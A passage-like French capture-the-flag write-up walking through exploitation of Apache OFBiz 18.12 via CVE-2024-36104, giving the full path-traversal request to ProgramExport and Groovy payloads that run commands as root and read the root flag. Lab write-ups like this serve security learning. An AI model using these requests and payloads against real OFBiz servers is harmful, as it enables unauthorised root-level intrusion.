
## 🎯 Objectif

Trouver une vulnérabilité sur **Apache OFBiz 18.12** permettant d'exécuter des commandes sur la machine et récupérer le flag.

**IP :** `10.129.231.23`

---

## 1. 🔎 Trouver les services

```bash
nmap -sV 10.129.231.23
```

Ports intéressants :

```text
22 → SSH
80 → HTTP
443 → HTTPS
```

Le port 80 affichait seulement la page par défaut de NGINX.

Je teste donc aussi le HTTPS.

---

## 2. 🌐 Trouver les répertoires

```bash
gobuster dir -u https://10.129.231.23 -k -w /usr/share/wordlists/dirb/common.txt
```

Je trouve notamment :

```text
/catalog
```

En allant sur :

```text
https://10.129.231.23/catalog/
```

je suis redirigé vers :

```text
/catalog/control/main
```

J'arrive sur une page de connexion.

Dans le code source, je trouve :

```text
Powered by Apache OFBiz. Release 18.12
```

### 🧠 À retenir

Quand on trouve **le logiciel + sa version**, on peut chercher ses vulnérabilités connues.

---

## 3. 🐛 Identifier la vulnérabilité

La machine indique qu'elle utilise :

```text
CVE-2024-36104
```

Cette vulnérabilité concerne **Apache OFBiz**.

Elle permet notamment de faire un **Path Traversal** puis d'obtenir une **RCE**.

### Path Traversal ?

C'est lorsqu'on manipule un chemin avec des séquences comme :

```text
..
```

pour essayer de sortir du chemin prévu par l'application.

Ici, des caractères encodés sont utilisés :

```text
%2e
```

`%2e` représente `.`.

---

# 4. 🧪 Tester avec Burp Repeater

J'utilise Burp Suite → **Repeater** pour modifier les requêtes HTTP.

La requête intéressante devient :

```http
POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport HTTP/1.1
Host: 10.129.231.23
Content-Type: application/x-www-form-urlencoded
Connection: close

groovyProgram=test
```

Au début, j'obtiens :

```text
Web Tools Permission Error
```

Mais une erreur Groovy apparaît aussi :

```text
MissingPropertyException:
No such property: test
```

### 🧠 Interprétation

C'est une bonne information.

Cela signifie que :

```text
groovyProgram
      ↓
est interprété par Groovy
```

On a donc réussi à atteindre le mécanisme vulnérable.

---

# 5. 💻 Tester l'exécution d'une commande

Je remplace `test` par :

```groovy
throw new Exception('id'.execute().text)
```

Résultat :

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 🧠 Interprétation

La commande Linux `id` a été exécutée.

Et surtout :

```text
uid=0(root)
```

signifie que la commande est exécutée avec les privilèges **root**.

➡️ J'ai donc obtenu une **RCE en root**.

---

# 6. 📍 Comprendre où je suis

Commande :

```groovy
throw new Exception('pwd'.execute().text)
```

Résultat :

```text
/root/ofbiz-framework
```

Je sais maintenant que le répertoire courant est :

```text
/root/ofbiz-framework
```

---

# 7. 🚩 Récupérer le flag

Comme je suis `root`, je peux lire le fichier :

```text
/root/root.txt
```

Commande :

```groovy
throw new Exception('cat /root/root.txt'.execute().text)
```

Résultat :

```text
85ae696787f9c3b897311801fbd23cf6
```

➡️ **Root flag récupéré.**

---

# 🔗 Résumé de l'exploitation

```text
Nmap
 ↓
HTTPS
 ↓
Gobuster
 ↓
/catalog
 ↓
Apache OFBiz 18.12
 ↓
CVE-2024-36104
 ↓
Path Traversal
 ↓
ProgramExport
 ↓
groovyProgram
 ↓
RCE
 ↓
root
 ↓
cat /root/root.txt
 ↓
FLAG
```
---
## 🏁 Résultat

**Vulnérabilité :** CVE-2024-36104  
**Application :** Apache OFBiz 18.12  
**Technique :** Path Traversal → Groovy → RCE  
**Privilèges :** root  
**Flag :** `85ae696787f9c3b897311801fbd23cf6`